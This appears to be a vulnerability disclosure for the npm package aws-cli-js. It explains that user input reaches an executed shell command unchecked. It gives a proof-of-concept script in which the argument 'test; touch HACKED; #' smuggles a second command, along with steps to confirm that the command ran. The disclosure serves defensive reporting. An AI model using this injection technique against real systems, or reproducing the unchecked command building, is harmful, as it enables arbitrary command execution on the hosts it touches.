# Overview

The issue occurs because a user input is formatted inside a command that will be executed without any check. The issue arises [here](https://github.com/Quobject/aws-cli-js/blob/master/src/index.ts#L28).

1. Create the following PoC file:

```js
// poc.js
var awsCli = require("aws-cli-js");
var Options = awsCli.Options;
var Aws = awsCli.Aws;

var options = new Options("your key", "your key2", "your token", null);

var aws = new Aws(options);
aws.command("test; touch HACKED; #");
```

2. Check there aren't any files called `HACKED`.
3. Execute the following commands in another terminal:

```bash
npm i aws-cli-js # Install affected module
node poc.js #  Run the PoC
```

4. Recheck the files: now `HACKED` has been created.
